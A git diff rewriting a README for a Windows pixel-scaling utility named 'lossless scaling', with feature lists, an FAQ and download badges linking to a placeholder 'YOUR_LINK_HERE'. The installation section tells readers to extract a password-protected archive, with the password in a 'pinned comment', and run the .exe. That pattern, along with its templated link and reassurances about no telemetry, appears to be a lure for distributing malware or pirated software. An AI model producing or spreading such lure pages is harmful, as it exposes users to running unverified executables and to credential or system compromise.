@@ -1,68 +1,64 @@
 <div align="center">
-  <p align="center">
-    <img src="https://img.shields.io/badge/─────────────────────────────────────────-0d1117?style=flat-square&labelColor=0d1117&color=0d1117" alt="divider"/>
-    <br/>
-    <span style="letter-spacing: 0.3em; font-size: 1.4em;"><b>lossless scaling</b></span>
-    <br/>
-    <img src="https://img.shields.io/badge/─────────────────────────────────────────-0d1117?style=flat-square&labelColor=0d1117&color=0d1117" alt="divider"/>
-  </p>
-  <sub>Sharp pixels. Real time. No compromises.</sub>
-  <br/><br/>
-  ![Platform](https://img.shields.io/badge/Platform-Windows-21262d?style=flat-square&labelColor=0d1117&color=21262d)
-  ![Release](https://img.shields.io/badge/Release-Latest-21262d?style=flat-square&labelColor=0d1117&color=21262d)
-  <br/><br/>
-  [![ ↓ Download ](https://img.shields.io/badge/ ↓ DOWNLOAD -ffffff?style=for-the-badge&labelColor=0d1117&color=0d1117)](YOUR_LINK_HERE)
+<br>
+<sup>— W I N D O W S &nbsp;·&nbsp; D E S K T O P —</sup>
+<br>
+# lossless scaling
+<br>
+<em>Integer scaling done right — crisp pixels, zero blur, your way.</em>
+<br><br>
+![platform](https://img.shields.io/badge/platform-Windows-0d1117?style=flat-square&labelColor=21262d&logo=windows&logoColor=white) ![license](https://img.shields.io/badge/license-MIT-0d1117?style=flat-square&labelColor=21262d) ![release](https://img.shields.io/badge/release-latest-0d1117?style=flat-square&labelColor=21262d)
+<br>
+[![Download](https://img.shields.io/badge/DOWNLOAD-0d1117?style=for-the-badge&logo=github&logoColor=white)](YOUR_LINK_HERE)
+<br><br>
 </div>
 
 <div align="center">
   <img src="assets/image.png" width="780" alt="screenshot"/>
 </div>
 
-Lossless Scaling is a desktop utility that lets you scale any window or game with pixel-perfect precision while preserving every detail of the original image. Built for those who refuse to accept blurry upscaling or forced aspect ratios.
+Lossless Scaling is a compact Windows desktop utility that lets you scale any window or game with perfect pixel precision. No blur, no stretching artifacts — just clean, sharp results whether you're running retro titles at 4K or modern apps on high-DPI displays.
 
-Whether you're running older games, working with pixel art, or simply want your desktop applications to look crisp on high-resolution displays — this is the tool that does exactly what it says and nothing more.
+Built for people who actually care how things look on screen. One executable, no services, no telemetry. It stays out of your way until you need it.
 
 ## ✦ Features
-- **Real-time scaling** — Applies advanced algorithms instantly to any window without performance overhead.
-- **Lossless pixel preservation** — Maintains original sharpness and detail where it matters most.
-- **Custom aspect ratios** — Scale content freely while keeping proportions or stretching intentionally when needed.
-- **Per-window profiles** — Save and restore scaling settings for individual applications.
-- **Hotkey control** — Quick toggle and adjustment without leaving your workflow.
-- **Lightweight core** — Runs quietly in the background with minimal resource usage.
-- **No injection** — Works with any DirectX, OpenGL, Vulkan or windowed application.
+- **Integer Scaling** — Multiplies pixels by whole numbers for perfect sharpness
+- **Custom Scaling Factors** — Fine-tune from 1x up to 8x or any value in between
+- **Real-time Preview** — See changes instantly without restarting your app
+- **Per-Window Profiles** — Save and restore settings for individual windows
+- **Hotkey Support** — Quick activation with a single key combination
+- **Borderless Window Handling** — Works cleanly with games and fullscreen apps
+- **Lightweight & Portable** — Runs directly from the extracted folder
 
-## ◆ Requirements
+## › Requirements
 - Windows 10 or Windows 11 (64-bit)
-- DirectX 11 compatible graphics card recommended
-- Administrator rights not required for basic operation
+- DirectX 11 compatible graphics card
+- No additional runtime dependencies
 
-## ▸ Installation
-
-Get the latest release —
-[![ ↓ Download ](https://img.shields.io/badge/ ↓ DOWNLOAD -ffffff?style=for-the-badge&labelColor=0d1117&color=0d1117)](YOUR_LINK_HERE)
-
+## › Installation
+[![Download](https://img.shields.io/badge/DOWNLOAD-0d1117?style=for-the-badge&logo=github&logoColor=white)](YOUR_LINK_HERE)
+<br>
 1. Extract the archive
 2. Archive password: `see pinned comment`
 3. Run the `.exe` file
-
-*No installer, no background services. Just the app.*
+*No installer. No background services. Just the app.*
 
 ## › FAQ
+**Q: Does it work with games?**  
+A: Yes. It handles both windowed and borderless fullscreen modes well. Some exclusive fullscreen titles may need borderless mode enabled first.
 
-**Q: Does it work with fullscreen games?**  
-A: Yes. It supports both borderless windowed and exclusive fullscreen modes.
+**Q: Will it affect performance?**  
+A: The overhead is minimal. Most users notice no measurable FPS drop.
 
-**Q: Will it affect game performance?**  
-A: The scaling engine is optimized to add almost zero overhead on modern hardware.
+**Q: Can I use it with multiple monitors?**  
+A: Absolutely. You can apply different scaling to windows on different displays.
 
-**Q: Can I use it with emulators or pixel art software?**  
-A: Absolutely. Many users rely on it specifically for clean integer scaling and crisp retro visuals.
+**Q: Is there a way to toggle it quickly?**  
+A: Yes — assign a global hotkey in settings for instant on/off.
 
-**Q: Is there a portable version?**  
-A: The app is fully portable by design. Just extract and run.
-
-**Q: How do I remove it completely?**  
-A: Delete the folder. No registry entries or leftover files.
+**Q: Do you collect any data?**  
+A: No. The app runs completely offline with zero telemetry.
 
 ---
-<div align="center"><sub>© 2026 lossless scaling · All rights reserved</sub></div>
+<div align="center">
+<sub>© 2026 lossless scaling · All rights reserved</sub>
+</div>
